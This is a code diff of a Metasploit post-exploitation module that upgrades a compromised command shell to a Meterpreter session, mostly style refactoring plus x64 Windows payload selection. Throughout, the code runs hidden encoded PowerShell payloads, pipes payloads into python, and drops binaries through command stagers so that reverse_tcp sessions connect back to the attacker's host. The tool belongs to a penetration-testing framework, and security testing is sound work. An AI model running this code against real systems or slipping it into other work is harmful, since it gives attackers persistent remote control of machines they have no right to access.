@@ -9,39 +9,43 @@ class MetasploitModule < Msf::Post
   include Post::Windows::Powershell
 
   def initialize(info = {})
-    super(update_info(info,
-        'Name'          => 'Shell to Meterpreter Upgrade',
-        'Description'   => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Shell to Meterpreter Upgrade',
+        'Description' => %q{
           This module attempts to upgrade a command shell to meterpreter. The shell
           platform is automatically detected and the best version of meterpreter for
           the target is selected. Currently meterpreter/reverse_tcp is used on Windows
           and Linux, with 'python/meterpreter/reverse_tcp' used on all others.
         },
-        'License'       => MSF_LICENSE,
-        'Author'        => ['Tom Sellers <tom [at] fadedcode.net>'],
-        'Platform'      => [ 'linux', 'osx', 'unix', 'solaris', 'bsd', 'windows' ],
-        'SessionTypes'  => [ 'shell' ]
-      ))
+        'License' => MSF_LICENSE,
+        'Author' => ['Tom Sellers <tom [at] fadedcode.net>'],
+        'Platform' => [ 'linux', 'osx', 'unix', 'solaris', 'bsd', 'windows' ],
+        'SessionTypes' => [ 'shell' ]
+      )
+    )
     register_options(
       [
         OptAddressLocal.new('LHOST',
-          [false, 'IP of host that will receive the connection from the payload (Will try to auto detect).', nil]),
+                            [false, 'IP of host that will receive the connection from the payload (Will try to auto detect).', nil]),
         OptInt.new('LPORT',
-          [true, 'Port for payload to connect to.', 4433]),
+                   [true, 'Port for payload to connect to.', 4433]),
         OptBool.new('HANDLER',
-          [ true, 'Start an exploit/multi/handler to receive the connection', true])
-      ])
+                    [ true, 'Start an exploit/multi/handler to receive the connection', true])
+      ]
+    )
     register_advanced_options([
       OptInt.new('HANDLE_TIMEOUT',
-        [true, 'How long to wait (in seconds) for the session to come back.', 30]),
+                 [true, 'How long to wait (in seconds) for the session to come back.', 30]),
       OptEnum.new('WIN_TRANSFER',
-        [true, 'Which method to try first to transfer files on a Windows target.', 'POWERSHELL', ['POWERSHELL', 'VBS']]),
+                  [true, 'Which method to try first to transfer files on a Windows target.', 'POWERSHELL', ['POWERSHELL', 'VBS']]),
       OptString.new('PAYLOAD_OVERRIDE',
-        [false, 'Define the payload to use (meterpreter/reverse_tcp by default) .', nil]),
+                    [false, 'Define the payload to use (meterpreter/reverse_tcp by default) .', nil]),
       OptString.new('BOURNE_PATH',
-        [false, 'Remote path to drop binary']),
+                    [false, 'Remote path to drop binary']),
       OptString.new('BOURNE_FILE',
-        [false, 'Remote filename to use for dropped binary'])
+                    [false, 'Remote filename to use for dropped binary'])
     ])
     deregister_options('PERSIST', 'PSH_OLD_METHOD', 'RUN_WOW64')
   end
@@ -51,7 +55,7 @@ class MetasploitModule < Msf::Post
     print_status("Upgrading session ID: #{datastore['SESSION']}")
 
     if session.type == 'meterpreter'
-      print_error("Meterpreter sessions cannot be upgraded any higher")
+      print_error('Meterpreter sessions cannot be upgraded any higher')
       return nil
     end
 
@@ -78,21 +82,31 @@ class MetasploitModule < Msf::Post
     case session.platform
     when 'windows', 'win'
       platform = 'windows'
-      payload_name = 'windows/meterpreter/reverse_tcp'
       lplat = [Msf::Platform::Windows]
-      larch = [ARCH_X86]
-      psh_arch = 'x86'
-      vprint_status("Platform: Windows")
+      arch = cmd_exec('wmic os get osarchitecture')
+      if arch =~ /64-bit/m
+        payload_name = 'windows/x64/meterpreter/reverse_tcp'
+        larch = [ARCH_X64]
+        psh_arch = 'x64'
+      elsif arch =~ /32-bit/m
+        payload_name = 'windows/meterpreter/reverse_tcp'
+        larch = [ARCH_X86]
+        psh_arch = 'x86'
+      else
+        print_error('Target is running Windows on an unsupported architecture such as Windows ARM!')
+        return nil
+      end
+      vprint_status('Platform: Windows')
     when 'osx'
       platform = 'osx'
       payload_name = 'osx/x64/meterpreter/reverse_tcp'
       lplat = [Msf::Platform::OSX]
       larch = [ARCH_X64]
-      vprint_status("Platform: OS X")
+      vprint_status('Platform: OS X')
     when 'solaris'
       platform = 'python'
       payload_name = 'python/meterpreter/reverse_tcp'
-      vprint_status("Platform: Solaris")
+      vprint_status('Platform: Solaris')
     else
       # Find the best fit, be specific with uname to avoid matching hostname or something else
       target_info = cmd_exec('uname -ms')
@@ -102,18 +116,18 @@ class MetasploitModule < Msf::Post
         payload_name = 'linux/x86/meterpreter/reverse_tcp'
         lplat = [Msf::Platform::Linux]
         larch = [ARCH_X86]
-        vprint_status("Platform: Linux")
+        vprint_status('Platform: Linux')
       elsif target_info =~ /darwin/i
         platform = 'osx'
         payload_name = 'osx/x64/meterpreter/reverse_tcp'
         lplat = [Msf::Platform::OSX]
         larch = [ARCH_X64]
-        vprint_status("Platform: OS X")
+        vprint_status('Platform: OS X')
       elsif cmd_exec('python -V 2>&1') =~ /Python (2|3)\.(\d)/
         # Generic fallback for OSX, Solaris, Linux/ARM
         platform = 'python'
         payload_name = 'python/meterpreter/reverse_tcp'
-        vprint_status("Platform: Python [fallback]")
+        vprint_status('Platform: Python [fallback]')
       end
     end
     payload_name = datastore['PAYLOAD_OVERRIDE'] if datastore['PAYLOAD_OVERRIDE']
@@ -150,9 +164,9 @@ class MetasploitModule < Msf::Post
                       when 'old'
                         Rex::Powershell::Payload.to_win32pe_psh(template_path, payload_data)
                       when 'msil'
-                        fail RuntimeError, 'MSIL Powershell method no longer exists'
+                        raise 'MSIL Powershell method no longer exists'
                       else
-                        fail RuntimeError, 'No Powershell method specified'
+                        raise 'No Powershell method specified'
                       end
 
         # prepend_sleep => 1
@@ -160,36 +174,36 @@ class MetasploitModule < Msf::Post
 
         encoded_psh_payload = encode_script(psh_payload)
         cmd_exec(run_hidden_psh(encoded_psh_payload, psh_arch, true))
-      else
-        if (have_powershell?) && (datastore['WIN_TRANSFER'] != 'VBS')
-          vprint_status("Transfer method: Powershell")
-          psh_opts = { :persist => false, :prepend_sleep => 1 }
-          unless session.type == 'shell'
-            psh_opts[:remove_comspec] = true
-          end
-          cmd_exec(cmd_psh_payload(payload_data, psh_arch, psh_opts))
+      elsif have_powershell? && (datastore['WIN_TRANSFER'] != 'VBS')
+        vprint_status('Transfer method: Powershell')
+        psh_opts = { persist: false, prepend_sleep: 1 }
+        if session.type == 'shell'
+          cmd_exec("echo. | #{cmd_psh_payload(payload_data, psh_arch, psh_opts)}")
         else
-          print_error('Powershell is not installed on the target.') if datastore['WIN_TRANSFER'] == 'POWERSHELL'
-          vprint_status("Transfer method: VBS [fallback]")
-          exe = Msf::Util::EXE.to_executable(framework, larch, lplat, payload_data)
-          aborted = transmit_payload(exe, platform)
+          psh_opts[:remove_comspec] = true
+          cmd_exec(cmd_psh_payload(payload_data, psh_arch, psh_opts))
         end
+      else
+        print_error('Powershell is not installed on the target.') if datastore['WIN_TRANSFER'] == 'POWERSHELL'
+        vprint_status('Transfer method: VBS [fallback]')
+        exe = Msf::Util::EXE.to_executable(framework, larch, lplat, payload_data)
+        aborted = transmit_payload(exe, platform)
       end
     when 'python'
-      vprint_status("Transfer method: Python")
+      vprint_status('Transfer method: Python')
       cmd_exec("echo \"#{payload_data}\" | python")
     when 'osx'
-      vprint_status("Transfer method: Python [OSX]")
+      vprint_status('Transfer method: Python [OSX]')
       payload_data = Msf::Util::EXE.to_python_reflection(framework, ARCH_X64, payload_data, {})
       cmd_exec("echo \"#{payload_data}\" | python & disown")
     else
-      vprint_status("Transfer method: Bourne shell [fallback]")
+      vprint_status('Transfer method: Bourne shell [fallback]')
       exe = Msf::Util::EXE.to_executable(framework, larch, lplat, payload_data)
       aborted = transmit_payload(exe, platform)
     end
 
     if datastore['HANDLER']
-      vprint_status("Cleaning up handler")
+      vprint_status('Cleaning up handler')
       cleanup_handler(listener_job_id, aborted)
     end
     return nil
@@ -200,16 +214,16 @@ class MetasploitModule < Msf::Post
     # Generate the stager command array
     #
     linemax = 1700
-    if (session.exploit_datastore['LineMax'])
+    if session.exploit_datastore['LineMax']
       linemax = session.exploit_datastore['LineMax'].to_i
     end
     opts = {
-      :linemax => linemax,
-      #:nodelete => true # keep temp files (for debugging)
+      linemax: linemax
+      # :nodelete => true # keep temp files (for debugging)
     }
     case platform
     when 'windows'
-      opts[:decoder] = File.join(Rex::Exploitation::DATA_DIR, "exploits", "cmdstager", 'vbs_b64')
+      opts[:decoder] = File.join(Rex::Exploitation::DATA_DIR, 'exploits', 'cmdstager', 'vbs_b64')
       cmdstager = Rex::Exploitation::CmdStagerVBS.new(exe)
     when 'osx'
       opts[:background] = true
@@ -233,14 +247,14 @@ class MetasploitModule < Msf::Post
     total_bytes = 0
     cmds.each { |cmd| total_bytes += cmd.length }
 
-    vprint_status("Starting transfer...")
+    vprint_status('Starting transfer...')
     begin
       #
       # Run the commands one at a time
       #
       sent = 0
       aborted = false
-      cmds.each { |cmd|
+      cmds.each do |cmd|
         ret = cmd_exec(cmd)
         if !ret
           aborted = true
@@ -257,11 +271,11 @@ class MetasploitModule < Msf::Post
         sent += cmd.length
 
         progress(total_bytes, sent)
-      }
+      end
     rescue ::Interrupt
       # TODO: cleanup partial uploads!
       aborted = true
-    rescue => e
+    rescue StandardError => e
       print_error("Error: #{e}")
       aborted = true
     end
@@ -272,7 +286,8 @@ class MetasploitModule < Msf::Post
   def cleanup_handler(listener_job_id, aborted)
     # Return if the job has already finished
     return nil if framework.jobs[listener_job_id].nil?
-    framework.threads.spawn('ShellToMeterpreterUpgradeCleanup', false) {
+
+    framework.threads.spawn('ShellToMeterpreterUpgradeCleanup', false) do
       if !aborted
         timer = 0
         timeout = datastore['HANDLE_TIMEOUT']
@@ -284,7 +299,7 @@ class MetasploitModule < Msf::Post
       end
       print_status('Stopping exploit/multi/handler')
       framework.jobs.stop_job(listener_job_id)
-    }
+    end
   end
 
   #
@@ -292,21 +307,21 @@ class MetasploitModule < Msf::Post
   #
   def progress(total, sent)
     done = (sent.to_f / total.to_f) * 100
-    print_status("Command stager progress: %3.2f%% (%d/%d bytes)" % [done.to_f, sent, total])
+    print_status(format('Command stager progress: %3.2f%% (%d/%d bytes)', done.to_f, sent, total))
   end
 
   # Method for checking if a listener for a given IP and port is present
   # will return true if a conflict exists and false if none is found
   def check_for_listener(lhost, lport)
-    client.framework.jobs.each do |k, j|
-      if j.name =~ / multi\/handler/
-        current_id = j.jid
-        current_lhost = j.ctx[0].datastore['LHOST']
-        current_lport = j.ctx[0].datastore['LPORT']
-        if lhost == current_lhost && lport == current_lport.to_i
-          print_error("Job #{current_id} is listening on IP #{current_lhost} and port #{current_lport}")
-          return true
-        end
+    client.framework.jobs.each do |_k, j|
+      next unless j.name =~ %r{ multi/handler}
+
+      current_id = j.jid
+      current_lhost = j.ctx[0].datastore['LHOST']
+      current_lport = j.ctx[0].datastore['LPORT']
+      if lhost == current_lhost && lport == current_lport.to_i
+        print_error("Job #{current_id} is listening on IP #{current_lhost} and port #{current_lport}")
+        return true
       end
     end
     return false
@@ -330,11 +345,11 @@ class MetasploitModule < Msf::Post
       mh.options.validate(mh.datastore)
       # Execute showing output
       mh.exploit_simple(
-          'Payload'     => mh.datastore['PAYLOAD'],
-          'LocalInput'  => self.user_input,
-          'LocalOutput' => self.user_output,
-          'RunAsJob'    => true
-        )
+        'Payload' => mh.datastore['PAYLOAD'],
+        'LocalInput' => user_input,
+        'LocalOutput' => user_output,
+        'RunAsJob' => true
+      )
 
       # Check to make sure that the handler is actually valid
       # If another process has the port open, then the handler will fail
